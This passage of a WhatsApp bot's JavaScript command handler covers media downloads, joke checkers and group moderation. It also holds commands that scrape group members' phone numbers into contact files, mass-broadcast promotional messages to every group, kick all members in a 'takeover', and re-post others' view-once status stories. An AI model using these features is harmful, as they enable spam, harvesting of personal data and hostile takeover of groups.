> Powered By Azbry API`;
            if (data.thumb) {
              await client.sendMessage(m.chat, {
                image: {
                  url: data.thumb
                },
                caption
              }, {
                quoted: m
              });
            }
            if (data.videos && data.videos.length > 0) {
              for (let video of data.videos) {
                await client.sendMessage(m.chat, {
                  video: {
                    url: video
                  },
                  caption: "✅ video Instagram success downloaded."
                }, {
                  quoted: m
                });
              }
            }
            if (data.images && data.images.length > 0) {
              for (let img of data.images) {
                await client.sendMessage(m.chat, {
                  image: {
                    url: img
                  },
                  caption: "✅ photo Instagram success downloaded."
                }, {
                  quoted: m
                });
              }
            }
            if ((!data.videos || data.videos.length === 0) && (!data.images || data.images.length === 0)) {
              return xreply("❌ Media not found.");
            }
          } catch (e) {
            console.log(e);
            xreply(`❌ Error\n${e.message}`);
          }
        }
        break;

      /// ───────────── [ 𝖢𝖾𝗄 𝖪𝗁𝗈𝖽𝖺𝗆 ] ──────────── ///
      case 'cekkhodam':
      case 'cekkodam':
        {
          if (!text) return reply("type your name");
          const khodam = pickRandom(["Kaleng Cat Avian", "Pipa Rucika", "King black", "Two-door wardrobe", "Kacang Hijau", "Kulkas mini", "Burung beo", "Air", "Api", "Batu", "Magnet", "Sempak", "Botol Tupperware", "Badut Mixue", "Sabun GIV", "Sandal Swallow", "Jarjit", "Ijat", "Fizi", "Mail", "Ehsan", "Upin", "Ipin", "sungut lele", "Tok Dalang", "Opah", "Opet", "Alul", "Pak Vinsen", "Maman Resing", "Pak RT", "ETI admin", "Bung Towel", "Lumpia Basah", "Bjorka", "Hacker", "Martabak Manis", "Baso Tahu", "Tahu Gejrot", "Dimsum", "Seblak", "Aromanis", "Gelembung sabun", "Kuda", "Seblak Ceker", "Telor Gulung", "Tahu Aci", "Tempe Mendoan", "Nasi Kucing", "Kue Cubit", "Tahu Sumedang", "Nasi Uduk", "Wedang Ronde", "Kerupuk Udang", "Cilok", "Cilung", "Kue Sus", "Jasuke", "Seblak Makaroni", "Sate Padang", "Sayur Asem", "Kromboloni", "Marmut Pink", "Belalang Mullet", "Kucing Oren", "Lintah Flying", "Singa Paddle Pop", "Macan Cisewu", "Vario Mber", "Beat Mber", "Supra Geter", "Oli Samping", "Knalpot Racing", "Jus Stroberi", "Jus Alpukat", "Alpukat Kocok", "Es Kopyor", "Es Jeruk", "@adiwajshing/baileys", "chalk", "gradient-string", "@adiwajshing", "d-scrape", "undefined", "cannot read properties", "performance-now", "os", "node-fetch", "form-data", "axios", "util", "fs-extra", "scrape-primbon", "child_process", "emoji-regex", "check-disk-space", "perf_hooks", "moment-timezone", "cheerio", "fs", "process", "require( . . . )", "import ... from ...", "rate-overlimit", "Cappucino Cincau", "Jasjus Melon", "Teajus Apel", "Pop ice Mangga", "Teajus Gulabatu", "Air Selokan", "Air Kobokan", "TV Tabung", "Keran Air", "Pot lid", "Kotak Amal", "Thermos lid", "Bottle cap", "Kresek Item", "Kepala Casan", "Ban Serep", "Kursi Lipat", "Kursi Goyang", "Kulit Pisang", "Warung Madura", "Gorong-gorong"]);
          const response = `Khodam mu is: *${khodam}*`;
          xreply(response);
        }
        break;

      /// ───────────── [ 𝖢𝖾𝗄 𝖦𝖺𝗇𝗍𝖾𝗇𝗀/𝖢𝖺𝗇𝗍𝗂𝗄 ] ──────────── ///
      case 'cekganteng':
      case 'cekcantik':
        {
          const teks = text ? text.trim() : '';
          let targetJid;
          let targetName;
          if (m.mentionedJid && m.mentionedJid.length > 0) {
            targetJid = m.mentionedJid[0];
            targetName = await client.getName(targetJid);
          } else if (/^\d{5,}$/.test(teks)) {
            targetJid = teks.includes('@s.whatsapp.net') ? teks : teks + '@s.whatsapp.net';
            targetName = await client.getName(targetJid).catch(() => teks);
          } else if (teks) {
            targetJid = m.sender;
            targetName = teks;
          } else {
            targetJid = m.sender;
            targetName = await client.getName(m.sender);
          }
          const score = Math.floor(Math.random() * 100) + 1;
          let komentar, emoji;
          if (command == 'cekganteng') {
            if (score >= 90) {
              komentar = 'His looks overload! Bikin cewek-cewek auto salfok!';
              emoji = '🔥👑💯';
            } else if (score >= 75) {
              komentar = 'Fix calon idol K-Pop, visualnya ngalahin artis!';
              emoji = '✨🧸💘';
            } else if (score >= 60) {
              komentar = "Not bad, you could be a school magazine cover boy.";
              emoji = '😎👍';
            } else if (score >= 40) {
              komentar = "Still handsome... as long as you use lighting and 10 layers of filters.";
              emoji = '🤔😅📸';
            } else if (score >= 20) {
              komentar = "Handsome like a one-bar signal in the woods.";
              emoji = '📵🌲😂';
            } else {
              komentar = 'Ouch... hiding the looks, are we?';
              emoji = '🥲💀👻';
            }
            const result = `*handsomeness check for:* ${targetName}\n\n` + `*Value Ganteng:* *${score}/100* ${emoji}\n\n` + `*Komentar:* ${komentar}`;
            client.sendMessage(m.chat, {
              text: result,
              mentions: [targetJid]
            }, {
              quoted: m
            });
          } else if (command == 'cekcantik') {
            if (score >= 90) {
              komentar = 'Her beauty makes flowers jealous and the moon insecure.';
              emoji = '🌷✨🌙';
            } else if (score >= 75) {
              komentar = "Manisnya like senja in tepi pantai, adem dipandang.";
              emoji = '🌅🍬🥰';
            } else if (score >= 60) {
              komentar = "The charm is simple but hits home, like morning coffee.";
              emoji = '☕🌼😊';
            } else if (score >= 40) {
              komentar = "Beautiful... but like WiFi, sometimes there, sometimes gone.";
              emoji = '📶🤏🥲';
            } else if (score >= 20) {
              komentar = 'Her beauty may need an update to the latest version.';
              emoji = '💻🤖🫣';
            } else {
              komentar = "Her beauty is like a riddle, still a mystery.";
              emoji = '🕵️‍♀️❓🌑';
            }
            const result = `*Beauty check for:* ${targetName}\n\n` + `*Score Kecantikan:* *${score}/100* ${emoji}\n\n` + `*Komentar:* ${komentar}`;
            client.sendMessage(m.chat, {
              text: result,
              mentions: [targetJid]
            }, {
              quoted: m
            });
          }
        }
        break;

      /// ───────────── [ 𝖣𝖾𝗅𝖾𝗍𝖾 & 𝖱𝖾𝖺𝖽𝗆𝗈𝗋𝖾 ] ──────────── ///
      case "delete":
      case "del":
        {
          if (!isOwner) return reply(mess.owner);
          if (!m.quoted) return xreply("reply its message");
          await client.sendMessage(m.chat, {
            delete: {
              remoteJid: m.chat,
              fromMe: Boolean(m.quoted.fromMe),
              id: m.quoted.id,
              participant: m.quoted.sender
            }
          });
        }
        break;
      case 'readmore':
        {
          if (!text.includes('|')) return xreply("use the symbol \"|\" to separate the text parts with the readmore effect.\nexample:.readmore i | like | you ❤️");
          const more = String.fromCharCode(8206).repeat(4001);
          const teks = text.split('|').join(more);
          xreply(teks);
        }
        break;

      /// ───────────── [ 𝖲𝖺𝗏𝖾 𝖪𝗈𝗇𝗍𝖺𝗄 ] ──────────── ///
      case "savecontacts2":
        {
          if (!isOwner) return reply(mess.owner);
          if (!m.isGroup) return reply(mess.group);
          let res = await m.metadata;
          const halls = await res.participants.filter(v => v.id.endsWith('.net')).map(v => v.id);
          for (let mem of halls) {
            if (mem !== botNumber && mem.split("@")[0] !== global.owner) {
              contacts.push(mem);
              fs.writeFileSync('./library/database/contacts.json', JSON.stringify(contacts));
            }
          }
          try {
            const uniqueContacts = [...new Set(contacts)];
            const vcardContent = uniqueContacts.map((contact, index) => {
              const vcard = ["BEGIN:VCARD", "VERSION:3.0", `FN:Buyer Skyzopedia - ${contact.split("@")[0]}`, `TEL;type=CELL;type=VOICE;waid=${contact.split("@")[0]}:+${contact.split("@")[0]}`, "END:VCARD", ""].join("\n");
              return vcard;
            }).join("");
            fs.writeFileSync("./library/database/contacts.vcf", vcardContent, "utf8");
          } catch (err) {
            xreply(err.toString());
          } finally {
            if (m.chat !== m.sender) await xreply(`*Contact file created successfully ✅*
The contact file has been sent to your private chat
Total *${halls.length}* contacts`);
            await client.sendMessage(m.sender, {
              document: fs.readFileSync("./library/database/contacts.vcf"),
              fileName: "contacts.vcf",
              caption: `contact file successfully created ✅
Total *${halls.length}* contacts`,
              mimetype: "text/vcard"
            }, {
              quoted: m
            });
            contacts.splice(0, contacts.length);
            await fs.writeFileSync("./library/database/contacts.json", JSON.stringify(contacts));
            await fs.writeFileSync("./library/database/contacts.vcf", "");
          }
        }
        break;
      case "savecontacts":
        {
          if (!isOwner) return reply(mess.owner);
          if (!text) return xreply(example("idgrupnya"));
          let res = await client.groupMetadata(text);
          const halls = await res.participants.filter(v => v.id.endsWith('.net')).map(v => v.id);
          for (let mem of halls) {
            if (mem !== botNumber && mem.split("@")[0] !== global.owner) {
              contacts.push(mem);
              fs.writeFileSync('./library/database/contacts.json', JSON.stringify(contacts));
            }
          }
          try {
            const uniqueContacts = [...new Set(contacts)];
            const vcardContent = uniqueContacts.map((contact, index) => {
              const vcard = ["BEGIN:VCARD", "VERSION:3.0", `FN:Buyer Skyzopedia - ${contact.split("@")[0]}`, `TEL;type=CELL;type=VOICE;waid=${contact.split("@")[0]}:+${contact.split("@")[0]}`, "END:VCARD", ""].join("\n");
              return vcard;
            }).join("");
            fs.writeFileSync("./library/database/contacts.vcf", vcardContent, "utf8");
          } catch (err) {
            xreply(err.toString());
          } finally {
            if (m.chat !== m.sender) await xreply(`*Contact file created successfully ✅*
The contact file has been sent to your private chat
Total *${halls.length}* contacts`);
            await client.sendMessage(m.sender, {
              document: fs.readFileSync("./library/database/contacts.vcf"),
              fileName: "contacts.vcf",
              caption: `contact file successfully created ✅
Total *${halls.length}* contacts`,
              mimetype: "text/vcard"
            }, {
              quoted: m
            });
            contacts.splice(0, contacts.length);
            await fs.writeFileSync("./library/database/contacts.json", JSON.stringify(contacts));
            await fs.writeFileSync("./library/database/contacts.vcf", "");
          }
        }
        break;

      /// ───────────── [ 𝖩𝖯𝖬 (𝗆𝖺𝗌𝗌 𝗆𝖾𝗌𝗌𝖺𝗀𝗂𝗇𝗀) ] ──────────── ///
      case "jpm3":
        {
          if (!isOwner) return reply(mess.owner);
          const teks = getJpmText();
          if (!teks) return xreply(example("text by sending a photo"));
          if (!/^image\//i.test(getJpmMime())) return xreply(example("text by sending a photo"));
          let mediaPath;
          try {
            mediaPath = await client.downloadAndSaveMediaMessage(qmsg);
            const imageBuffer = await fs.promises.readFile(mediaPath);
            if (!imageBuffer.length) throw new Error("Image file is empty or could not be read.");
            await broadcastJpmGroups("JPM3 (photo/testimoni)", () => ({
              footer: `© 2026 ${botname}`,
              buttons: [{
                buttonId: ".owner",
                buttonText: {
                  displayText: "Owner"
                },
                type: 1
              }],
              headerType: 1,
              viewOnce: true,
              image: imageBuffer,
              caption: `\n${teks}\n`,
              contextInfo: {
                isForwarded: true,
                ...(global.newsletterInfo ? { forwardedNewsletterMessageInfo: global.newsletterInfo } : {})
              }
            }));
          } catch (error) {
            console.error("[JPM3 ERROR]", error?.stack || error);
            await xreply(`❌ JPM3 failed processed: ${error?.message || error}`);
          } finally {
            if (mediaPath) {
              await fs.promises.unlink(mediaPath).catch(() => {});
            }
          }
        }
        break;
      case "jpm":
        {
          if (!isOwner) return reply(mess.owner);
          const teks = getJpmText();
          if (!teks) return xreply(example("the text or reply message text"));
          try {
            await broadcastJpmGroups("JPM (text)", () => ({
              text: teks
            }));
          } catch (error) {
            console.error("[JPM ERROR]", error?.stack || error);
            await xreply(`❌ JPM failed processed: ${error?.message || error}`);
          }
        }
        break;
      case "jpm2":
        {
          if (!isOwner) return reply(mess.owner);
          const teks = getJpmText();
          if (!teks) return xreply(example("text by sending a video"));
          if (!/^video\//i.test(getJpmMime())) return xreply(example("text by sending a video"));
          let mediaPath;
          try {
            mediaPath = await client.downloadAndSaveMediaMessage(qmsg);
            const videoBuffer = await fs.promises.readFile(mediaPath);
            if (!videoBuffer.length) throw new Error("Video file is empty or could not be read.");
            await broadcastJpmGroups("JPM2 (video)", () => ({
              video: videoBuffer,
              caption: teks
            }));
          } catch (error) {
            console.error("[JPM2 ERROR]", error?.stack || error);
            await xreply(`❌ JPM2 failed processed: ${error?.message || error}`);
          } finally {
            if (mediaPath) {
              await fs.promises.unlink(mediaPath).catch(() => {});
            }
          }
        }
        break;

      /// ───────────── [ 𝖦𝗋𝗈𝗎𝗉 𝖬𝖺𝗇𝖺𝗀𝖾𝗆𝖾𝗇𝗍 ] ──────────── ///
      case "tagall":
        {
          if (!isOwner && !isPremium) return reply(mess.owner);
          if (!text) return xreply(example("pesannya"));
          let teks = text + "\n\n";
          let member = await m.metadata.participants.map(v => v.id).filter(e => e !== botNumber && e !== m.sender);
          await member.forEach(e => {
            teks += `@${e.split("@")[0]}\n`;
          });
          await client.sendMessage(m.chat, {
            text: teks,
            mentions: [...member]
          }, {
            quoted: m
          });
        }
        break;
      case "add":
        {
          if (!isOwner && !isPremium) return reply(mess.owner);
          if (text) {
            const input = text ? text.replace(/[^0-9]/g, "") + "@s.whatsapp.net" : false;
            var onWa = await client.onWhatsApp(input.split("@")[0]);
            if (onWa.length < 1) return xreply("the number is not registered on WhatsApp");
            const res = await client.groupParticipantsUpdate(m.chat, [input], 'add');
            if (Object.keys(res).length == 0) {
              return xreply(`success Adding ${input.split("@")[0]} into the group `);
            } else {
              return xreply(JSON.stringify(res, null, 2));
            }
          } else {
            return xreply(example("62838###"));
          }
        }
        break;
      case "ht":
      case "hidetag":
        {
          if (!isOwner && !isPremium) return reply(mess.owner);
          if (!text) return xreply(example("pesannya"));
          let member = m.metadata.participants.map(v => v.id);
          await client.sendMessage(m.chat, {
            text: text,
            mentions: [...member]
          }, {
            quoted: m
          });
        }
        break;
      case "kick":
      case "kik":
        {
          if (!isOwner && !isPremium) return reply(mess.owner);
          if (text || m.quoted) {
            const input = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text ? text.replace(/[^0-9]/g, "") + "@s.whatsapp.net" : false;
            var onWa = await client.onWhatsApp(input.split("@")[0]);
            if (onWa.length < 1) return xreply("the number is not registered on WhatsApp");
            const res = await client.groupParticipantsUpdate(m.chat, [input], 'remove');
            await xreply(`success mengeluarkan ${input.split("@")[0]} from the group `);
          } else {
            return xreply(example("@tag/reply"));
          }
        }
        break;
      case "leave":
        {
          if (!isOwner && !isPremium) return reply(mess.owner);
          await xreply("okay, I am leaving the group ");
          await sleep(4000);
          await client.groupLeave(m.chat);
        }
        break;
      case "kudetagc":
      case "kudeta":
        {
          if (!isOwner) return reply(mess.owner);
          let memberFilter = await m.metadata.participants.map(v => v.id).filter(e => e !== botNumber && e !== m.sender);
          if (memberFilter.length < 1) return xreply("group already no Member!");
          await xreply("Only the group owner can take over.");
          for (let i of memberFilter) {
            await client.groupParticipantsUpdate(m.chat, [i], 'remove');
            await sleep(1000);
          }
          await xreply("Group takeover complete 🏴‍☠️");
        }
        break;
      case "demote":
      case "promote":
        {
          if (!isOwner && !isPremium) return reply(mess.owner);
          if (m.quoted || text) {
            var action;
            let target = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
            if (/demote/.test(command)) action = "Demote";
            if (/promote/.test(command)) action = "Promote";
            await client.groupParticipantsUpdate(m.chat, [target], action.toLowerCase()).then(async () => {
              await client.sendMessage(m.chat, {
                text: `Success ${action.toLowerCase()} @${target.split("@")[0]}`,
                mentions: [target]
              }, {
                quoted: m
              });
            });
          } else {
            return xreply(example("@tag/628xxx"));
          }
        }
        break;
      case "mute":
        {
          if (!isOwner && !isPremium) return reply(mess.owner);
          if (!m.isGroup) return reply('Mute only works inside a group.');
          global.db.groups[m.chat] ||= {};
          let teks = text.toLowerCase();
          if (teks == "on") {
            if (global.db.groups[m.chat].mute == true) return xreply(`*Mute* is already enabled in the group!`);
            global.db.groups[m.chat].mute = true;
            return xreply("success turning on *mute* in group ");
          } else if (teks == "off") {
            if (global.db.groups[m.chat].mute == false) return xreply(`*Mute* in group inactive!`);
            global.db.groups[m.chat].mute = false;
            return xreply("success disabling *mute* in group ");
          } else return xreply(example("on/off"));
        }
        break;
      case "antilink2":
        {
          if (!m.isGroup) return reply(mess.group);
          if (!isOwner) return reply(mess.owner);
          if (!text) return xreply(example("on/off"));
          let teks = text.toLowerCase();
          if (teks == "on") {
            if (global.db.groups[m.chat].antilink2 == true) return xreply(`*Antilink2* is already enabled in the group!`);
            if (global.db.groups[m.chat].antilink == true) global.db.groups[m.chat].antilink = false;
            global.db.groups[m.chat].antilink2 = true;
            return reply("success turning on *antilink2* in group ");
          } else if (teks == "off") {
            if (global.db.groups[m.chat].antilink2 == false) return xreply(`*Antilink2* in group inactive!`);
            global.db.groups[m.chat].antilink2 = false;
            return reply("success disabling *antilink2* in group ");
          } else return xreply(example("on/off"));
        }
        break;

      /// ───────────── [ Anti Tag Status ] ──────────── ///
      case "antitagsw":
        {
          if (!m.isGroup) return reply(mess.group);
          if (!isOwner && !isSenderAdmin) return reply(mess.admin);
          if (!text) return xreply(example("on/off"));
          let teks = text.toLowerCase();
          if (teks == "on") {
            if (global.db.groups[m.chat].antitagsw == true) return xreply(`*Antitagsw* is already enabled in the group!`);
            global.db.groups[m.chat].antitagsw = true;
            global.markDatabaseDirty?.();
            return reply("success turning on *antitagsw* in group " + (isBotAdmin ? "" : "\n\n⚠️ Bot not yet jadi admin, jadikan bot admin so that can delete message tag status."));
          } else if (teks == "off") {
            if (global.db.groups[m.chat].antitagsw == false) return xreply(`*Antitagsw* in group inactive!`);
            global.db.groups[m.chat].antitagsw = false;
            global.markDatabaseDirty?.();
            return reply("success disabling *antitagsw* in group ");
          } else return xreply(example("on/off"));
        }
        break;

      /// ───────────── [ Get Story WhatsApp ] ──────────── ///
      case "getsw":
      case "ambilsw":
      case "storywa":
        {
          if (!isOwner && !isPremium) return reply(mess.prem);
          const swCache = client.statusCache;
          const swUserKey = (jid = '') => String(jid || '').split('@')[0].split(':')[0];
          if (!swCache || swCache.size === 0) {
            return xreply("📭 no story captured.\n\nThe bot can only capture stories *while it is online* (the last 24 hours at most).");
          }
          if (/^list$/i.test((text || '').trim())) {
            const rows = [];
            for (const [user, items] of swCache) {
              const fresh = items.filter(e => Date.now() - e.timestamp < 24 * 60 * 60 * 1000);
              if (fresh.length) rows.push(`• @${user} — ${fresh.length} story`);
            }
            if (!rows.length) return xreply("📭 no story captured.");
            return client.sendMessage(m.chat, {
              text: `*Sw Tersimpan*\n${rows.slice(0, 40).join("\n")}
Get with: ${prefix}getsw @user`,
              mentions: rows.slice(0, 40).map(r => r.match(/@(\d+)/)[1] + "@s.whatsapp.net")
            }, {
              quoted: m
            });
          }
          const swArgs = (text || '').trim().split(/\s+/).filter(Boolean);
          let swTarget = m.mentionedJid?.[0] || m.quoted?.sender || '';
          let swIndex = 0;
          if (!swTarget) {
            const num = (swArgs[0] || '').replace(/[^0-9]/g, '');
            if (num.length >= 8) {
              swTarget = num + "@s.whatsapp.net";
              swIndex = parseInt(swArgs[1]) || 0;
            } else if (!m.isGroup) {
              swTarget = m.chat;
              swIndex = parseInt(swArgs[0]) || 0;
            }
          } else {
            swIndex = parseInt(swArgs.find(a => /^\d{1,2}$/.test(a))) || 0;
          }
          if (!swTarget) return xreply(example("@user") + `\nAtau: *${prefix}getsw 628xxx*
list: *${prefix}getsw list*`);
          const swKeys = new Set([swUserKey(swTarget)]);
          try {
            const mapper = client.signalRepository?.lidMapping;
            if (mapper) {
              const lid = await mapper.getLIDForPN?.(swTarget.includes('@') ? swTarget : swTarget + '@s.whatsapp.net');
              if (lid) swKeys.add(swUserKey(lid));
              const pn = await mapper.getPNForLID?.(swTarget);
              if (pn) swKeys.add(swUserKey(pn));
            }
          } catch {}
          const seen = new Set();
          let swItems = [];
          for (const k of swKeys) {
            for (const e of swCache.get(k) || []) {
              if (seen.has(e.key.id)) continue;
              seen.add(e.key.id);
              if (Date.now() - e.timestamp < 24 * 60 * 60 * 1000) swItems.push(e);
            }
          }
          swItems.sort((a, b) => a.timestamp - b.timestamp);
          if (!swItems.length) {
            return client.sendMessage(m.chat, {
              text: `📭 no story from @${swUserKey(swTarget)} tertangkap.

the bot can only capture stories while it is online, and only from contacts who share stories with the bot number.`,
              mentions: [swTarget.includes('@') ? swTarget : swTarget + '@s.whatsapp.net']
            }, {
              quoted: m
            });
          }
          const swTotal = swItems.length;
          if (swIndex > 0) swItems = swItems.slice(swIndex - 1, swIndex);else swItems = swItems.slice(0, 10);
          if (swIndex > 0 && !swItems.length) return xreply(`❌ Story number ${swIndex} no. Total story: ${swTotal}`);
          await xreply(`⏳ 𝖬𝖾𝗇𝗀𝖺𝗆𝖻𝗂𝗅 𝖲𝗐...`);
          const swDownload = async (node, type) => {
            const stream = await downloadContentFromMessage(node, type);
            const chunks = [];
            for await (const chunk of stream) chunks.push(chunk);
            return Buffer.concat(chunks);
          };
          const swMention = [swTarget.includes('@') ? swTarget : swTarget + '@s.whatsapp.net'];
          let swFailed = 0;
          for (const item of swItems) {
            try {
              let content = item.message;
              for (let i = 0; i < 3; i++) {
                const t = getContentType(content);
                if (/viewOnceMessage|ephemeralMessage|documentWithCaptionMessage/i.test(t || '')) content = content[t].message;else break;
              }
              const type = getContentType(content);
              const node = content[type];
              const when = moment(item.timestamp).tz('Asia/Jakarta').format('DD/MM HH:mm');
              const head = `🔔 𝖲𝗐 @${swUserKey(swTarget)} - ${when}`;
              if (type === 'imageMessage') {
                const buf = await swDownload(node, 'image');
                await client.sendMessage(m.chat, {
                  image: buf,
                  caption: `${head}${node.caption ? '\n\n' + node.caption : ''}`,
                  mentions: swMention
                }, {
                  quoted: m
                });
              } else if (type === 'videoMessage') {
                const buf = await swDownload(node, 'video');
                await client.sendMessage(m.chat, {
                  video: buf,
                  caption: `${head}${node.caption ? '\n\n' + node.caption : ''}`,
                  mentions: swMention
                }, {
                  quoted: m
                });
              } else if (type === 'audioMessage') {
                const buf = await swDownload(node, 'audio');
                await client.sendMessage(m.chat, {
                  audio: buf,
                  mimetype: node.mimetype || 'audio/mpeg',
                  ptt: !!node.ptt
                }, {
                  quoted: m
                });
              } else if (type === 'extendedTextMessage' || type === 'conversation') {
                const teksSw = type === 'conversation' ? node : node.text;
                await client.sendMessage(m.chat, {
                  text: `${head}\n\n${teksSw || ''}`,
                  mentions: swMention
                }, {
                  quoted: m
                });
              } else {
                swFailed++;
                continue;
              }
              await sleep(1200);
            } catch (err) {
              swFailed++;
              console.log('[GETSW]', err?.message || err);
            }
          }
          if (swFailed) await xreply(`⚠️ ${swFailed} story could not be fetched (possibly already expired or the type is not supported).`);
          if (swIndex === 0 && swTotal > swItems.length) {
            await xreply(`ℹ️ Showing ${swItems.length} from ${swTotal} story. fetch one by one: *${prefix}getsw @user <number>*`);
          }
        }
        break;
      case "antilink":
        {
          if (!m.isGroup) return reply(mess.group);
          if (!isOwner) return reply(mess.owner);
          if (!text) return xreply(example("on/off"));
          let teks = text.toLowerCase();
          if (teks == "on") {
            if (global.db.groups[m.chat].antilink == true) return xreply(`*Antilink* is already enabled in the group!`);
            if (global.db.groups[m.chat].antilink2 == true) global.db.groups[m.chat].antilink2 = false;
            global.db.groups[m.chat].antilink = true;
            return reply("success turning on *antilink* in group ");
          } else if (teks == "off") {
            if (global.db.groups[m.chat].antilink == false) return xreply(`*Antilink* in group inactive!`);
            global.db.groups[m.chat].antilink = false;
            return reply("success disabling *antilink* in group ");
          } else return xreply(example("on/off"));
        }
        break;
      case "welcome":
        {
          if (!m.isGroup) return reply(mess.group);
          if (!isOwner) return reply(mess.owner);
          if (!text) return reply(example("on/off"));
          let teks = text.toLowerCase();
          if (teks == "on") {
            if (global.db.groups[m.chat].welcome == true) return reply(`*Welcome* is already enabled in the group!`);
            global.db.groups[m.chat].welcome = true;
            return xreply("success turning on *welcome* in group ");
          } else if (teks == "off") {
            if (global.db.groups[m.chat].welcome == false) return reply(`*Welcome* in group inactive!`);
            global.db.groups[m.chat].welcome = false;
            return reply("success disabling *welcome* in group ");
          } else return xreply(example("on/off"));
        }
        break;
      case 'antilinkch':
        {
          if (!m.isGroup) return reply(mess.group);
          if (!isOwner) return reply(mess.owner);
          if (!antichannel[m.chat]) antichannel[m.chat] = {
            active: false,
            warnings: {},
            antichannel: false
          };
          const argsLower = q.toLowerCase();
          if (argsLower === 'on') {
            antichannel[m.chat].antichannel = true;
            saveAntichannel();
            Reply("✅ anti WhatsApp channel link is now enabled!");
          } else if (argsLower === 'off') {
            antichannel[m.chat].antichannel = false;
            saveAntichannel();
            Reply('❌ Anti Link Channel WhatsApp OFF!');
          } else {
            Reply(`example:
*${prefix}antichannel on*\n*${prefix}antichannel off*`);
          }
        }
        break;

      /// ───────────── [ 𝖩𝖺𝖽𝗂𝖻𝗈𝗍 ] ──────────── ///
      case "jadibot":
        {
          const targetNumber = String(text || "").trim().replace(/[^0-9]/g, "");
          if (!targetNumber) {
            return xreply(`❌ example: .jadibot 628xxx`);
          }
          if (!/^62\d{8,15}$/.test(targetNumber)) {
            return xreply(`❌ Format number invalid.

use the international format without + or spaces.
example:.jadibot 628xxx`);
          }
          const result = await jadibotManager.start(client, targetNumber, module.exports, m);
          if (result.message) await xreply(result.message);
        }
        break;
      case "bataljadibot":
        {
          const targetNumber = String(args[1] || "").trim().replace(/[^0-9]/g, "");
          let result;
          if (targetNumber) {
            result = await jadibotManager.cancelByTarget(targetNumber, m.sender);
          } else {
            result = await jadibotManager.cancelByRequester(m.sender);
          }
          if (result.unauthorized) return xreply(result.message);
          if (!result.ok) return xreply(result.message || "❌ no jadibot process found.");
          const number = result.number || targetNumber;
          await xreply(`✅ *Jadibot ${number ? number + ' ' : ''}success cancelled*`);
        }
        break;
      case "stopjadibot":
        {
          const targetJid = m.sender;
          const active = jadibotManager.entries?.get?.(targetJid);
          if (!active) {
            return xreply("❌ you do not have an active jadibot.");
          }
          try {
            await xreply("⏹️ *Jadibot stopped...*\n\nSession clone will deleted and koneksi will closed.");
          } catch (error) {}
          await jadibotManager.stop(targetJid, true);
        }
        break;
      case "listjadibot":
        {
          if (!isOwner) return reply(mess.owner);
          const active = await jadibotManager.listActive();
          if (!active.length) return xreply(`╭─〔 *jadibot list* 〕
│ no active jadibot.
│ Limit: *${jadibotManager.max} people*
╰──────────────`);
          let teks = `╭─〔 *jadibot list enabled* 〕
`;
          for (const item of active) {
            teks += `│ ${item.no}. @${item.number} — *${item.status}*\n`;
          }
          teks += `├──────────────
│ enabled: *${active.length}/${jadibotManager.max} people*
╰──────────────`;
          await client.sendMessage(m.chat, {
            text: teks,
            mentions: active.map(item => item.jid)
          }, {
            quoted: m
          });
        }
        break;

      /// ───────────── [ 𝖮𝗐𝗇𝖾𝗋 & 𝖡𝗈𝗍 𝖬𝖺𝗇𝖺𝗀𝖾𝗆𝖾𝗇𝗍 ] ──────────── ///
      case "totalfitur":
        {
          try {
            let total = totalfitur();
            Reply(`*Total feature enabled when:* ${total} feature!`);
          } catch (e) {
            Reply(`failed membaca total feature:
${e.message}`);
          }
        }
        break;
      case "developerbot":
      case "owner":
        {
          await client.sendContact(m.chat, [global.owner], m);
        }
        break;
      case "save":
      case "sv":
        {
          if (!isOwner) return;
          await client.sendContact(m.chat, [m.chat.split("@")[0]], m);
        }
        break;
      case "ping":
      case "uptime":
        {
          let timestamp = speed();
          let latensi = speed() - timestamp;
          let tio = await nou.os.oos();
          var tot = await nou.drive.info();
          let respon = `
*🔴 INFORMATION SERVER*

*• Platform :* ${nou.os.type()}
*• Total Ram :* ${formatp(os.totalmem())}
*• Total Disk :* ${tot.totalGb} GB
*• Total Cpu :* ${os.cpus().length} Core
*• Runtime Vps :* ${runtime(os.uptime())}

*🔵 INFORMATION ${global.botname}*

*• Respon Speed :* ${latensi.toFixed(4)} seconds
*• Runtime Bot :* ${runtime(process.uptime())}
`;
          await xreply(respon);
        }
        break;
      case "public":
        {
          if (!isOwner) return;
          client.public = true;
          xreply("success changing to mode *public*");
        }
        break;
      case "self":
        {
          if (!isOwner) return xreply(mess.owner);
          client.public = false;
          xreply("success changing mode bot become *Self*");
        }
        break;
      case "restart":
      case "rst":
        {
          if (!isOwner) return reply(mess.owner);
          await xreply("Restarting the server...");
          var file = await fs.readdirSync("./session");
          var anu = await file.filter(i => i !== "creds.json");
          for (let t of anu) {
            await fs.unlinkSync(`./session/${t}`);
          }
          await process.send("reset");
        }
        break;
      case "clearchat":
      case "clc":
        {
          if (!isOwner) return reply(mess.owner);
          client.chatModify({
            delete: true,
            lastMessages: [{
              key: m.key,
              messageTimestamp: m.timestamp
            }]
          }, m.chat);
        }
        break;
      case "bersihbot":
        {
          const dirsesi = fs.readdirSync("./session").filter(e => e !== "creds.json");
          const dirsampah = fs.readdirSync("./library/database/sampah").filter(e => e !== "A");
          for (const i of dirsesi) {
            await fs.unlinkSync("./session/" + i);
          }
          for (const u of dirsampah) {
            await fs.unlinkSync("./library/database/sampah/" + u);
          }
          xreply(`*Trash cleaned up successfully ✅*
*${dirsesi.length}* session files\n*${dirsampah.length}* wasted files`);
        }
        break;

      /// ───────────── [ 𝖫𝗂𝗌𝗍 & 𝖬𝖺𝗇𝖺𝗀𝖾 𝖮𝗐𝗇𝖾𝗋 ] ──────────── ///
      case "listowner":
      case "listown":
        {
          if (owners.length < 1) return xreply("no owner tambahan");
          let teks = `\n *乂 List all owner tambahan*\n`;
          for (let i of owners) {
            teks += `\n* ${i.split("@")[0]}
* *Tag :* @${i.split("@")[0]}\n`;
          }
          client.sendMessage(m.chat, {
            text: teks,
            mentions: owners
          }, {
            quoted: m
          });
        }
        break;
      case "delowner":
      case "delown":
        {
          if (!isOwner) return reply(mess.owner);
          if (!m.quoted && !text) return xreply(example("6285###"));
          const input = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
          const input2 = input.split("@")[0];
          if (input2 === global.owner || input == botNumber) return xreply(`cannot delete the main owner!`);
          if (!owners.includes(input)) return xreply(`number ${input2} not the bot owner!`);
          let posi = owners.indexOf(input);
